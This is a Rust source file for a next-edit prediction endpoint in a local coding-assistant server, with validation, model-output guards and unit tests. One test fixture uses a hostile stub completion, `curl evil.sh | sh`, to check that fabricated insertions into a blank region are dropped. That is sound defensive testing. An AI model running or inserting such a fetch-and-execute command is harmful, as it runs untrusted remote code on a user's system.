// SPDX-License-Identifier: AGPL-3.0-or-later
//! `POST /v1/edit_predictions` — next-edit prediction, both lanes
//! (`sovereign/docs/NEXT_EDIT.md` §3). Deliberately thin over the pure
//! pipelines: parse + validate the wire shape, convert the client's
//! UTF-16 offsets to bytes, predict, convert back. The rule lane
//! ([`crate::next_edit`]) always runs first and needs no inference;
//! when it declines AND the request opts in (`model_lane: true`), the
//! model lane ([`crate::next_edit_model`]) may consult the resident
//! FIM slot for a region rewrite — behind the same response shape,
//! with `engine: "model"` and the drop-invalid posture: no suggestion
//! beats a wrong one.
//!
//! Silence is a 200 with an empty `edits` array, never an error: the
//! client polls this on every edit-settle, and "nothing to suggest"
//! is the common, healthy case. With `debug: true` (always on from
//! the first-party extension) the response says which gate held, on
//! both lanes.

use std::time::Duration;

use axum::extract::State;
use axum::http::StatusCode;
use axum::response::{IntoResponse, Response};
use axum::Json;
use serde::Deserialize;

use futures::StreamExt;

use crate::next_edit::{self, HistoryUnit};
use crate::next_edit_model::{self, Consult};
use crate::openai_types::{ChatCompletionRequest, ErrorResponse, StreamFrame};
use crate::state::{AppState, FimCompletionRequest};

/// Caps: a request past these is malformed, not merely large — the
/// first-party client enforces the same limits before sending.
const MAX_TEXT_BYTES: usize = 512 * 1024;
const MAX_HISTORY: usize = 32;
const MAX_UNIT_BYTES: usize = 2 * 1024;

/// Transport-level body cap for this route (`server.rs` applies it),
/// well under the router-wide 8 MB frontdoor. Sized so no *legal*
/// request can trip it: 512 KiB of text can JSON-escape to 1 MiB in
/// the worst case, plus 32 units × 4 fields × 2 KiB of history, plus
/// envelope. Anything larger cannot satisfy the caps below, so it is
/// refused before serde allocates it rather than after.
pub const MAX_BODY_BYTES: usize = 2 * 1024 * 1024;

/// Model-lane inference budget; a slower response is dropped as
/// `timeout` (the GM5 latency gate lives in the §6 bank, not here).
const MODEL_TIMEOUT_MS: u64 = 15_000;

#[derive(Debug, Deserialize)]
pub struct EditPredictionsRequestWire {
    /// Coalesced edit units, oldest first.
    #[serde(default)]
    pub history: Vec<HistoryUnitWire>,
    /// Current document text (the search space for remaining sites).
    pub text: String,
    /// Cursor offset into `text`, in UTF-16 code units.
    #[serde(default)]
    pub cursor: usize,
    #[serde(default)]
    pub path: Option<String>,
    #[serde(default)]
    pub language: Option<String>,
    #[serde(default)]
    pub debug: bool,
    /// Opt-in to the model lane (P2). Off by default — the lane may
    /// not default-on until the §6 generalization bank says so
    /// (`gym/next-edit/gen/README.md`).
    #[serde(default)]
    pub model_lane: bool,
}

#[derive(Debug, Deserialize)]
pub struct HistoryUnitWire {
    pub before: String,
    pub after: String,
    #[serde(default)]
    pub left: String,
    #[serde(default)]
    pub right: String,
}

fn bad_request(msg: String) -> Response {
    (
        StatusCode::BAD_REQUEST,
        Json(serde_json::to_value(ErrorResponse::new(msg, "invalid_request")).unwrap_or_default()),
    )
        .into_response()
}

/// POST /v1/edit_predictions.
pub async fn edit_predictions(
    State(state): State<AppState>,
    Json(wire): Json<EditPredictionsRequestWire>,
) -> Response {
    let started = std::time::Instant::now();

    if wire.text.len() > MAX_TEXT_BYTES {
        return bad_request(format!(
            "`text` is {} bytes; /v1/edit_predictions caps the search space at {} — send the \
             active file, not a corpus",
            wire.text.len(),
            MAX_TEXT_BYTES
        ));
    }
    if wire.history.len() > MAX_HISTORY {
        return bad_request(format!(
            "{} history units; the induction window never looks past {} — send the most recent",
            wire.history.len(),
            MAX_HISTORY
        ));
    }
    if let Some((field, len)) = wire.history.iter().find_map(|u| {
        [("before", &u.before), ("after", &u.after), ("left", &u.left), ("right", &u.right)]
            .into_iter()
            .find(|(_, s)| s.len() > MAX_UNIT_BYTES)
            .map(|(name, s)| (name, s.len()))
    }) {
        return bad_request(format!(
            "a history unit exceeds {MAX_UNIT_BYTES} bytes per field (`{field}` is {len} bytes; \
             note the cap is BYTES, not chars) — units are coalesced keystroke bursts, not pastes"
        ));
    }

    // Only now, past validation: this sits on the interactive editing
    // path and must preempt background ingest work. Bumping before the
    // caps would let any local process suppress ingest indefinitely by
    // POSTing junk that 400s.
    state.bump_foreground_active();

    let history: Vec<HistoryUnit> = wire
        .history
        .iter()
        .map(|u| HistoryUnit {
            before: u.before.clone(),
            after: u.after.clone(),
            left: u.left.clone(),
            right: u.right.clone(),
        })
        .collect();
    let cursor = next_edit::utf16_to_byte(&wire.text, wire.cursor);
    let p = next_edit::predict(&history, &wire.text, cursor);

    let mut engine = "rule";
    let mut final_edits: Vec<next_edit::Edit> = p.edits.clone();
    let mut model_debug: Option<serde_json::Value> = None;
    if wire.model_lane {
        let (m_edits, dbg) = model_lane(&state, &wire, &history, &p, cursor).await;
        if let Some(me) = m_edits {
            engine = "model";
            final_edits = me;
        }
        model_debug = Some(dbg);
    }

    // Byte → UTF-16 for the wire, one pass for all edit boundaries.
    let boundaries: Vec<usize> = final_edits.iter().flat_map(|e| [e.start, e.end]).collect();
    let utf16 = next_edit::bytes_to_utf16(&wire.text, &boundaries);
    let edits: Vec<serde_json::Value> = final_edits
        .iter()
        .zip(utf16.chunks_exact(2))
        .map(|(e, se)| {
            serde_json::json!({ "start": se[0], "end": se[1], "new_text": e.new_text })
        })
        .collect();

    let model_state = match &model_debug {
        None => "off".to_string(),
        Some(_) if engine == "model" => "fired".to_string(),
        Some(d) => d["dropped"]
            .as_str()
            .map(|r| format!("dropped:{r}"))
            .or_else(|| d["skipped"].as_str().map(|r| format!("skipped:{r}")))
            .unwrap_or_else(|| "silent".to_string()),
    };
    tracing::info!(
        target: "next_edit",
        path = wire.path.as_deref().unwrap_or("<unset>"),
        history = wire.history.len(),
        support = p.support,
        sites = p.sites,
        proposed = edits.len(),
        silent = p.reason_silent.unwrap_or("no"),
        engine,
        model = %model_state,
        elapsed_ms = started.elapsed().as_millis() as u64,
        "edit prediction"
    );

    let mut body = serde_json::json!({
        "object": "edit_prediction",
        "engine": engine,
        "edits": edits,
    });
    if wire.debug {
        body["sovereign_debug"] = serde_json::json!({
            "rule_find": p.rule.as_ref().map(|r| r.find.clone()),
            "rule_replace": p.rule.as_ref().map(|r| r.replace.clone()),
            "rule_key": p.rule.as_ref().map(next_edit::GuardedRule::key),
            "support": p.support,
            "sites": p.sites,
            "edits_capped": p.edits_capped,
            "reason_silent": p.reason_silent,
            "timings_ms": { "total": started.elapsed().as_millis() as u64 },
        });
        if let Some(m) = model_debug {
            body["sovereign_debug"]["model"] = m;
        }
    }
    Json(body).into_response()
}

/// The model lane, end to end: consult gate → slot budget → region →
/// prompt → inference → parse → diff. Returns the absolute-byte edits
/// on success; the debug value explains every other outcome
/// (`skipped` when the gate refused, `dropped` when the model was
/// consulted but its output didn't survive — NEXT_EDIT.md §9).
async fn model_lane(
    state: &AppState,
    wire: &EditPredictionsRequestWire,
    history: &[HistoryUnit],
    p: &next_edit::Prediction,
    cursor: usize,
) -> (Option<Vec<next_edit::Edit>>, serde_json::Value) {
    let (reason, needle) = match next_edit_model::should_consult(history, &wire.text, p) {
        Consult::No { skipped } => {
            return (None, serde_json::json!({ "consulted": false, "skipped": skipped }));
        }
        Consult::Yes { reason, needle } => (reason, needle),
    };
    let mut dbg = serde_json::json!({ "consulted": true, "reason": reason, "needle": needle });

    let Some(service) = state.inner.local_inference.clone() else {
        dbg["dropped"] = "unavailable".into();
        return (None, dbg);
    };
    let Some(fim) = service.fim_status() else {
        dbg["dropped"] = "unavailable".into();
        return (None, dbg);
    };
    dbg["model_id"] = fim.model_id.clone().into();
    dbg["slot"] = fim.slot.clone().into();
    let Ok(permit) = state.inner.next_edit_model_slot.clone().try_acquire_owned() else {
        dbg["dropped"] = "busy".into();
        return (None, dbg);
    };

    let (rs, re, needle_hit) =
        next_edit_model::select_region(&wire.text, cursor, dbg["needle"].as_str());
    let region = &wire.text[rs..re];
    // A region that blew the byte budget means a single line did (a
    // minified bundle is one 512 KiB line). Prefilling that on the
    // shared slot is a large, repeatable cost for a suggestion nobody
    // can read, so decline and say so.
    if region.len() > next_edit_model::MAX_REGION_BYTES {
        dbg["dropped"] = "region_too_large".into();
        dbg["region_bytes"] = region.len().into();
        return (None, dbg);
    }
    // An empty or blank region has nothing to rewrite, so every byte
    // the model returns is invention with no relationship to the file
    // — and the guards that normally bound a rewrite are all relative
    // to the region, so they bound nothing here. Reachable without
    // malice: the cursor in a run of blank lines, or a select-all
    // delete between two edits.
    if region.trim().is_empty() {
        dbg["dropped"] = "region_empty".into();
        return (None, dbg);
    }
    // A region that already contains the active format's markers
    // would make the prompt ambiguous about where the editable span
    // ends, and every faithful echo would then fail parsing — the
    // lane would look silently broken on that one file forever.
    // Decline out loud. Which strings poison the prompt depends on
    // the format the slot speaks.
    let format = fim.next_edit_format.clone();
    dbg["format"] = format.clone().into();
    let poisoned = match format.as_str() {
        "zeta2" => {
            region.contains("<|marker_")
                || region.contains("<[fim-")
                || region.contains(next_edit_model::ZETA_CURSOR)
        }
        "sweep" => region.contains(next_edit_model::SWEEP_FILE_SEP),
        _ => region.contains("editable_region"),
    };
    if poisoned {
        dbg["dropped"] = "region_has_markers".into();
        return (None, dbg);
    }
    let bounds = next_edit::bytes_to_utf16(&wire.text, &[rs, re]);
    dbg["region"] = serde_json::json!({ "start": bounds[0], "end": bounds[1] });
    dbg["needle_hit"] = needle_hit.into();

    let max_tokens = ((region.len() / 3) + 160).clamp(64, 1024) as u32;

    let t0 = std::time::Instant::now();
    // The permit rides INTO the task, not just this scope. Abandoning
    // a completion future does not stop the generation behind it: the
    // engine dispatches through `spawn_blocking`, and dropping a
    // `JoinHandle` detaches rather than cancels, so llama.cpp keeps
    // decoding and keeps the slot's context lock. If the permit were
    // released when we time out, every timed-out consult would leave a
    // live generation behind while the next request sailed through
    // `try_acquire` — the one-in-flight budget would stop bounding
    // anything precisely when the slot is most contended. Holding it
    // until the inference genuinely returns makes the next consult
    // report an honest `busy` instead.
    //
    // Both branches resolve to `Result<(content, finish_reason), _>`
    // so the outcome handling below is format-agnostic.
    let task = match format.as_str() {
        // Completion-style edit models: the lane builds the model's
        // own raw prompt and rides the FIM slot's verbatim path — a
        // chat template would wrap the special tokens in a user turn
        // and the fine-tune would never see its trained shape.
        "zeta2" | "sweep" => {
            let raw = if format == "zeta2" {
                next_edit_model::build_prompt_zeta2(
                    history,
                    &wire.text,
                    rs,
                    re,
                    cursor,
                    wire.path.as_deref(),
                )
            } else {
                next_edit_model::build_prompt_sweep(history, region, wire.path.as_deref())
            };
            // `</s>` is Sweep's documented terminator; zeta2's
            // `<|marker_2|>` is already a SeedCoder family stop.
            let stop = if format == "sweep" {
                vec!["</s>".to_string()]
            } else {
                Vec::new()
            };
            let freq = FimCompletionRequest {
                prefix: String::new(),
                suffix: String::new(),
                path: wire.path.clone(),
                language: wire.language.clone(),
                max_tokens: Some(max_tokens as usize),
                temperature: Some(0.0),
                stop,
                debug: false,
                raw_prompt: Some(raw),
            };
            tokio::spawn(async move {
                let out = match service.fim_completion_stream(freq).await {
                    Ok(start) => {
                        let mut stream = start.stream;
                        let mut content = String::new();
                        let mut result = None;
                        while let Some(frame) = stream.next().await {
                            match frame {
                                StreamFrame::Token(t) => content.push_str(&t),
                                StreamFrame::Finish { reason, .. } => {
                                    result = Some(Ok((
                                        std::mem::take(&mut content),
                                        Some(reason.as_openai_str().to_string()),
                                    )));
                                }
                                StreamFrame::Error(e) => {
                                    result = Some(Err(e));
                                    break;
                                }
                                _ => {}
                            }
                        }
                        // A closed channel without a terminal frame is
                        // a cancelled decode, not a completion.
                        result.unwrap_or_else(|| Err("stream ended without finish".to_string()))
                    }
                    Err(e) => Err(e),
                };
                drop(permit);
                out
            })
        }
        _ => {
            let prompt = next_edit_model::build_prompt(
                history,
                region,
                wire.path.as_deref(),
                wire.language.as_deref(),
                reason,
            );
            let req: ChatCompletionRequest = match serde_json::from_value(serde_json::json!({
                "model": fim.model_id,
                "messages": [{ "role": "user", "content": prompt }],
                "temperature": 0.1,
                "max_tokens": max_tokens,
            })) {
                Ok(r) => r,
                Err(e) => {
                    tracing::warn!(target: "next_edit", error = %e, "model lane request build failed");
                    dbg["dropped"] = "error".into();
                    return (None, dbg);
                }
            };
            tokio::spawn(async move {
                let out = service.chat_completion(req).await.map(|resp| {
                    let choice = resp.choices.into_iter().next();
                    let finish = choice.as_ref().and_then(|c| c.finish_reason.clone());
                    (choice.map(|c| c.message.content).unwrap_or_default(), finish)
                });
                drop(permit);
                out
            })
        }
    };
    let outcome = tokio::time::timeout(Duration::from_millis(MODEL_TIMEOUT_MS), task).await;
    dbg["timings_ms"] = serde_json::json!({ "inference": t0.elapsed().as_millis() as u64 });
    let content = match outcome {
        Err(_) => {
            dbg["dropped"] = "timeout".into();
            return (None, dbg);
        }
        Ok(Err(e)) => {
            tracing::warn!(target: "next_edit", error = %e, "model lane task failed");
            dbg["dropped"] = "error".into();
            return (None, dbg);
        }
        Ok(Ok(Err(e))) => {
            tracing::warn!(target: "next_edit", error = %e, "model lane inference error");
            dbg["dropped"] = "error".into();
            return (None, dbg);
        }
        Ok(Ok(Ok((content, finish)))) => {
            // A completion that hit the token ceiling is a region cut
            // off mid-rewrite. Diffed against the whole region it
            // reads as "delete everything after here" — the tail of
            // the region is missing, not unchanged.
            if finish.as_deref() == Some("length") {
                dbg["dropped"] = "truncated".into();
                return (None, dbg);
            }
            // Cancelled/errored decodes carry partial content; a
            // partial rewrite is the same mass-deletion hazard.
            if matches!(finish.as_deref(), Some("cancelled") | Some("error")) {
                dbg["dropped"] = "error".into();
                return (None, dbg);
            }
            content
        }
    };

    let parsed = match format.as_str() {
        "zeta2" => next_edit_model::parse_rewrite_zeta2(&content, region),
        "sweep" => next_edit_model::parse_rewrite_sweep(&content, region),
        _ => next_edit_model::parse_rewrite(&content, region),
    };
    let rewritten = match parsed {
        Ok(s) => s,
        Err(why) => {
            dbg["dropped"] = why.into();
            return (None, dbg);
        }
    };
    let region_edits = next_edit_model::diff_region(region, &rewritten);
    if region_edits.is_empty() {
        dbg["dropped"] = "noop".into();
        return (None, dbg);
    }
    // V0 content verifier: the structural guards above bound how much
    // changed; this holds WHAT changed to the exemplar transformation
    // the gate consulted over. The pair cannot be absent here — the
    // gate already required it — but a defensive miss just skips
    // verification rather than inventing a drop.
    if let Some((a, b)) = next_edit_model::exemplar_pair(history) {
        if let Err((why, idx)) =
            next_edit_model::verify_pattern(reason, a, b, region, &region_edits)
        {
            let e = &region_edits[idx];
            dbg["dropped"] = why.into();
            dbg["verify_hunk"] = serde_json::json!({
                "start": e.start,
                "end": e.end,
                "old": region[e.start..e.end].chars().take(120).collect::<String>(),
                "new": e.new_text.chars().take(120).collect::<String>(),
            });
            return (None, dbg);
        }
    }
    let edits = region_edits
        .into_iter()
        .map(|e| next_edit::Edit { start: rs + e.start, end: rs + e.end, new_text: e.new_text })
        .collect();
    (Some(edits), dbg)
}

#[cfg(test)]
mod tests {
    use std::sync::Arc;

    use async_trait::async_trait;
    use axum::body::Body;
    use axum::http::{Request, StatusCode};
    use futures::Stream;
    use std::pin::Pin;
    use tower::ServiceExt;

    use crate::openai_types::{ChatChoice, ChatCompletionResponse, ChatMessage, StreamFrame};
    use crate::state::{test_app_state, FimSlotStatus, LocalInferenceService};

    async fn post_to(app: axum::Router, body: serde_json::Value) -> (StatusCode, serde_json::Value) {
        let resp = app
            .oneshot(
                Request::post("/v1/edit_predictions")
                    .header("content-type", "application/json")
                    .body(Body::from(serde_json::to_vec(&body).unwrap()))
                    .unwrap(),
            )
            .await
            .unwrap();
        let status = resp.status();
        let bytes = axum::body::to_bytes(resp.into_body(), usize::MAX).await.unwrap();
        (status, serde_json::from_slice(&bytes).unwrap())
    }

    async fn post(body: serde_json::Value) -> (StatusCode, serde_json::Value) {
        post_to(crate::server::mock_router(test_app_state()), body).await
    }

    fn console_unit() -> serde_json::Value {
        serde_json::json!({
            "before": "log", "after": "debug",
            "left": "  console.", "right": "(\"x\");"
        })
    }

    /// Canned chat backend for the model lane: fixed completion text,
    /// FIM slot reported resident.
    struct StubChat {
        content: String,
        finish: &'static str,
    }

    #[async_trait]
    impl LocalInferenceService for StubChat {
        async fn chat_completion(
            &self,
            _r: crate::openai_types::ChatCompletionRequest,
        ) -> Result<ChatCompletionResponse, String> {
            Ok(ChatCompletionResponse {
                id: "t".into(),
                object: "chat.completion".into(),
                created: 0,
                model: "mellum-test".into(),
                choices: vec![ChatChoice {
                    index: 0,
                    message: ChatMessage::new("assistant", self.content.clone()),
                    finish_reason: Some(self.finish.into()),
                }],
                usage: None,
            })
        }
        async fn chat_completion_stream(
            &self,
            _r: crate::openai_types::ChatCompletionRequest,
        ) -> Result<Pin<Box<dyn Stream<Item = StreamFrame> + Send>>, String> {
            unimplemented!("streaming not used by the model lane")
        }
        fn provider_manifest(&self) -> Option<commonwealth_inference::oicp::ProviderManifest> {
            None
        }
        async fn embed(&self, _i: &str) -> Result<Vec<f32>, String> {
            unimplemented!()
        }
        fn fim_status(&self) -> Option<FimSlotStatus> {
            Some(FimSlotStatus {
                slot: "fim".into(),
                model_id: "mellum-test".into(),
                fim_style: "mellum".into(),
                aliased_to_fast: false,
                next_edit_format: "region_instruct".into(),
            })
        }
    }

    fn model_router(content: &str) -> axum::Router {
        let state =
        test_app_state()
            .with_local_inference(Arc::new(StubChat { content: content.into(), finish: "stop" }));
        crate::server::mock_router(state)
    }

    fn fanout_request(text: &str) -> serde_json::Value {
        serde_json::json!({
            "history": [
                { "before": "", "after": ", timeoutMS",
                  "left": "\tconn := dial(primaryHost, 8080", "right": ")" },
                { "before": "", "after": ", timeoutMS",
                  "left": "\tbackup := dial(backupHost, altPort", "right": ")" },
            ],
            "text": text,
            "cursor": 0,
            "debug": true,
            "model_lane": true
        })
    }

    const FANOUT_TEXT: &str = "\tconn := dial(primaryHost, 8080, timeoutMS)\n\
                               \tbackup := dial(backupHost, altPort, timeoutMS)\n\
                               \tmirror := dial(mirrorHost, 9090)\n";

    // ---- rule lane (unchanged contract) -------------------------------

    #[tokio::test]
    async fn two_supports_fire_and_queue_all_sites() {
        let text = "console.debug(1);\nconsole.debug(2);\nconsole.log(3);\nconsole.log(4);\n";
        let (status, body) = post(serde_json::json!({
            "history": [console_unit(), console_unit()],
            "text": text,
            "cursor": 30,
            "debug": true
        }))
        .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["engine"], "rule");
        let edits = body["edits"].as_array().unwrap();
        assert_eq!(edits.len(), 2);
        assert_eq!(edits[0]["start"], 36);
        assert_eq!(edits[0]["new_text"], "console.debug(");
        assert_eq!(body["sovereign_debug"]["support"], 2);
        assert_eq!(body["sovereign_debug"]["reason_silent"], serde_json::Value::Null);
    }

    #[tokio::test]
    async fn silence_is_200_with_reason_in_debug() {
        let (status, body) = post(serde_json::json!({
            "history": [console_unit()],
            "text": "console.log(9);",
            "cursor": 0,
            "debug": true
        }))
        .await;
        assert_eq!(status, StatusCode::OK);
        assert!(body["edits"].as_array().unwrap().is_empty());
        assert_eq!(body["sovereign_debug"]["reason_silent"], "below_threshold");
        assert_eq!(body["sovereign_debug"]["support"], 1);
    }

    #[tokio::test]
    async fn no_debug_means_no_debug_block() {
        let (_, body) = post(serde_json::json!({ "history": [], "text": "x", "cursor": 0 })).await;
        assert!(body.get("sovereign_debug").is_none());
    }

    #[tokio::test]
    async fn offsets_are_utf16_on_the_wire() {
        // Emoji before the sites: byte and UTF-16 offsets diverge.
        let text = "// 💡💡\nconsole.debug(1);\nconsole.debug(2);\nconsole.log(3);\n";
        let (_, body) = post(serde_json::json!({
            "history": [console_unit(), console_unit()],
            "text": text,
            "cursor": 0,
            "debug": true
        }))
        .await;
        let edits = body["edits"].as_array().unwrap();
        assert_eq!(edits.len(), 1);
        let start = edits[0]["start"].as_u64().unwrap() as usize;
        let end = edits[0]["end"].as_u64().unwrap() as usize;
        let units: Vec<u16> = text.encode_utf16().collect();
        assert_eq!(String::from_utf16(&units[start..end]).unwrap(), "console.log(");
    }

    #[tokio::test]
    async fn oversized_text_is_400_with_actionable_message() {
        let (status, body) = post(serde_json::json!({
            "history": [],
            "text": "x".repeat(super::MAX_TEXT_BYTES + 1),
            "cursor": 0
        }))
        .await;
        assert_eq!(status, StatusCode::BAD_REQUEST);
        assert!(body["error"]["message"].as_str().unwrap().contains("caps the search space"));
    }

    // ---- model lane ---------------------------------------------------

    #[tokio::test]
    async fn model_lane_fires_on_fanout_with_region_rewrite() {
        // The stub "model" completes the fan-out on the third call site.
        let rewrite = "\tconn := dial(primaryHost, 8080, timeoutMS)\n\
                       \tbackup := dial(backupHost, altPort, timeoutMS)\n\
                       \tmirror := dial(mirrorHost, 9090, timeoutMS)\n";
        let (status, body) = post_to(model_router(rewrite), fanout_request(FANOUT_TEXT)).await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["engine"], "model");
        let edits = body["edits"].as_array().unwrap();
        assert_eq!(edits.len(), 1, "one hunk on the un-edited site");
        // Insertion right before the closing paren of the mirror call.
        let start = edits[0]["start"].as_u64().unwrap() as usize;
        let end = edits[0]["end"].as_u64().unwrap() as usize;
        assert_eq!(start, end, "pure insertion");
        assert!(FANOUT_TEXT[..start].ends_with("9090"), "inserts after the last arg");
        assert_eq!(edits[0]["new_text"], ", timeoutMS");
        let m = &body["sovereign_debug"]["model"];
        assert_eq!(m["consulted"], true);
        assert_eq!(m["reason"], "fanout_insert");
        assert_eq!(m["model_id"], "mellum-test");
        assert!(m.get("dropped").is_none());
    }

    #[tokio::test]
    async fn model_lane_drops_a_reapplied_pattern_as_already_applied() {
        // Structurally flawless rewrite, wrong in content: the "model"
        // stacks the insertion onto a site that already carries it and
        // leaves the fresh site alone. The completion-trap shape — V0
        // must catch it at the content level, not the structure level.
        let rewrite = "\tconn := dial(primaryHost, 8080, timeoutMS)\n\
                       \tbackup := dial(backupHost, altPort, timeoutMS, timeoutMS)\n\
                       \tmirror := dial(mirrorHost, 9090)\n";
        let (status, body) = post_to(model_router(rewrite), fanout_request(FANOUT_TEXT)).await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["engine"], "rule", "verifier drop falls back to rule-lane silence");
        assert!(body["edits"].as_array().unwrap().is_empty());
        let m = &body["sovereign_debug"]["model"];
        assert_eq!(m["consulted"], true);
        assert_eq!(m["dropped"], "already_applied");
    }

    #[tokio::test]
    async fn model_lane_gate_refuses_dissimilar_history() {
        let (_, body) = post_to(
            model_router("anything"),
            serde_json::json!({
                "history": [
                    { "before": "parseHeader", "after": "readHeader",
                      "left": "  const h = ", "right": "(buf);" },
                    { "before": "5000", "after": "8000",
                      "left": "  const t = setTimeout(cb, ", "right": ");" },
                ],
                "text": "const backup = setTimeout(cb, 5000);\n",
                "cursor": 0,
                "debug": true,
                "model_lane": true
            }),
        )
        .await;
        assert_eq!(body["engine"], "rule");
        assert!(body["edits"].as_array().unwrap().is_empty());
        let m = &body["sovereign_debug"]["model"];
        assert_eq!(m["consulted"], false);
        assert_eq!(m["skipped"], "gate");
    }

    #[tokio::test]
    async fn model_lane_never_preempts_a_fired_rule() {
        let (_, body) = post_to(
            model_router("should never be consulted"),
            serde_json::json!({
                "history": [console_unit(), console_unit()],
                "text": "console.log(1);\nconsole.log(2);\n",
                "cursor": 0,
                "debug": true,
                "model_lane": true
            }),
        )
        .await;
        assert_eq!(body["engine"], "rule");
        assert!(!body["edits"].as_array().unwrap().is_empty());
        assert_eq!(body["sovereign_debug"]["model"]["skipped"], "rule_fired");
    }

    #[tokio::test]
    async fn model_lane_without_service_is_explained_silence() {
        // test_app_state has no inference service: the gate still runs
        // (consulted=true, deterministic), the consult is dropped.
        let (status, body) = post(fanout_request(FANOUT_TEXT)).await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["engine"], "rule");
        assert!(body["edits"].as_array().unwrap().is_empty());
        let m = &body["sovereign_debug"]["model"];
        assert_eq!(m["consulted"], true);
        assert_eq!(m["reason"], "fanout_insert");
        assert_eq!(m["dropped"], "unavailable");
    }

    #[tokio::test]
    async fn invalid_model_output_is_dropped_not_repaired() {
        let (_, body) = post_to(
            model_router("sure! here is <|editable_region_start|> stuff nested \
                          <|editable_region_start|> twice"),
            fanout_request(FANOUT_TEXT),
        )
        .await;
        assert_eq!(body["engine"], "rule");
        assert!(body["edits"].as_array().unwrap().is_empty());
        assert_eq!(body["sovereign_debug"]["model"]["dropped"], "invalid");
    }

    #[tokio::test]
    async fn unchanged_model_output_is_an_explained_noop() {
        let (_, body) = post_to(model_router(FANOUT_TEXT), fanout_request(FANOUT_TEXT)).await;
        assert_eq!(body["engine"], "rule");
        assert!(body["edits"].as_array().unwrap().is_empty());
        assert_eq!(body["sovereign_debug"]["model"]["dropped"], "noop");
    }

    /// A minified bundle is one enormous line, so the "24-line" region
    /// is the whole file. Prefilling that on the shared slot is a
    /// large, repeatable cost for a suggestion nobody could read, and
    /// every guard on the rewrite is relative to the region — so a
    /// region this size bounds nothing. Decline it by name.
    #[tokio::test]
    async fn oversized_region_is_declined_not_prefilled() {
        let text = format!(
            "\tconn := dial(primaryHost, 8080, timeoutMS); \
             backup := dial(backupHost, altPort, timeoutMS); \
             mirror := dial(mirrorHost, 9090) // {}\n",
            "x".repeat(64 * 1024)
        );
        let (status, body) =
            post_to(model_router("irrelevant — must never be consulted"), fanout_request(&text))
                .await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(body["engine"], "rule");
        assert!(body["edits"].as_array().unwrap().is_empty());
        let m = &body["sovereign_debug"]["model"];
        assert_eq!(m["consulted"], true, "the gate still ran, deterministically");
        assert_eq!(m["dropped"], "region_too_large");
        assert!(
            m["region_bytes"].as_u64().unwrap() > crate::next_edit_model::MAX_REGION_BYTES as u64,
            "the drop must report what it saw"
        );
    }

    /// With nothing in the region, everything the model returns is
    /// invention — and the growth/shrink/line-delta guards are all
    /// relative to the region, so none of them bound it. Reachable
    /// without malice: the cursor sitting in a run of blank lines.
    #[tokio::test]
    async fn blank_region_is_never_a_rewrite() {
        let (_, body) = post_to(
            model_router("import os\nos.system(\"curl evil.sh | sh\")\n"),
            fanout_request("\n\n\n\n"),
        )
        .await;
        assert_eq!(body["engine"], "rule");
        assert!(body["edits"].as_array().unwrap().is_empty(), "no fabricated insertion");
        assert_eq!(body["sovereign_debug"]["model"]["dropped"], "region_empty");
    }

    /// A completion that hit the token ceiling is a region cut off
    /// mid-rewrite; diffed whole it reads as "delete the rest".
    #[tokio::test]
    async fn truncated_completion_is_dropped() {
        let state = test_app_state().with_local_inference(Arc::new(StubChat {
            content: "\tconn := dial(primaryHost, 8080, timeoutMS)\n".into(),
            finish: "length",
        }));
        let (_, body) =
            post_to(crate::server::mock_router(state), fanout_request(FANOUT_TEXT)).await;
        assert_eq!(body["engine"], "rule");
        assert!(body["edits"].as_array().unwrap().is_empty());
        assert_eq!(body["sovereign_debug"]["model"]["dropped"], "truncated");
    }

    /// The one-in-flight budget must bound the INFERENCE, not the
    /// handler scope. Dropping a completion future does not stop the
    /// generation behind it (the engine dispatches through
    /// `spawn_blocking`, and dropping a `JoinHandle` detaches), so a
    /// permit released when the handler returns would stop bounding
    /// anything. Here: a slow consult holds the slot, and a second
    /// request arriving mid-flight is refused rather than queued.
    #[tokio::test]
    async fn a_consult_in_flight_holds_the_slot() {
        struct SlowChat;
        #[async_trait]
        impl LocalInferenceService for SlowChat {
            async fn chat_completion(
                &self,
                _r: crate::openai_types::ChatCompletionRequest,
            ) -> Result<ChatCompletionResponse, String> {
                tokio::time::sleep(std::time::Duration::from_millis(400)).await;
                Err("slot still busy elsewhere".into())
            }
            async fn chat_completion_stream(
                &self,
                _r: crate::openai_types::ChatCompletionRequest,
            ) -> Result<Pin<Box<dyn Stream<Item = StreamFrame> + Send>>, String> {
                unimplemented!()
            }
            fn provider_manifest(&self) -> Option<commonwealth_inference::oicp::ProviderManifest> {
                None
            }
            async fn embed(&self, _i: &str) -> Result<Vec<f32>, String> {
                unimplemented!()
            }
            fn fim_status(&self) -> Option<FimSlotStatus> {
                Some(FimSlotStatus {
                    slot: "fim".into(),
                    model_id: "mellum-test".into(),
                    fim_style: "mellum".into(),
                    aliased_to_fast: false,
                    next_edit_format: "region_instruct".into(),
                })
            }
        }
        let state = test_app_state().with_local_inference(Arc::new(SlowChat));
        let app = crate::server::mock_router(state);

        let first = tokio::spawn({
            let app = app.clone();
            async move { post_to(app, fanout_request(FANOUT_TEXT)).await }
        });
        tokio::time::sleep(std::time::Duration::from_millis(80)).await;
        let (_, second) = post_to(app, fanout_request(FANOUT_TEXT)).await;
        assert_eq!(
            second["sovereign_debug"]["model"]["dropped"], "busy",
            "a consult already has the slot; the second must not queue behind it"
        );
        let (_, first) = first.await.unwrap();
        assert_eq!(first["sovereign_debug"]["model"]["dropped"], "error");
    }

    #[tokio::test]
    async fn oversized_unit_400_names_the_offending_field() {
        let (status, body) = post(serde_json::json!({
            "history": [{
                "before": "x", "after": "y",
                "left": "L".repeat(super::MAX_UNIT_BYTES + 1), "right": ""
            }],
            "text": "x",
            "cursor": 0
        }))
        .await;
        assert_eq!(status, StatusCode::BAD_REQUEST);
        let msg = body["error"]["message"].as_str().unwrap();
        assert!(msg.contains("`left`"), "must name the field that tripped: {msg}");
        assert!(msg.contains("BYTES"), "clients measure chars; say which unit: {msg}");
    }

    #[tokio::test]
    async fn model_lane_off_by_default_leaves_no_trace() {
        let (_, body) = post_to(
            model_router("anything"),
            serde_json::json!({
                "history": [], "text": "x", "cursor": 0, "debug": true
            }),
        )
        .await;
        assert!(body["sovereign_debug"].get("model").is_none());
    }
}
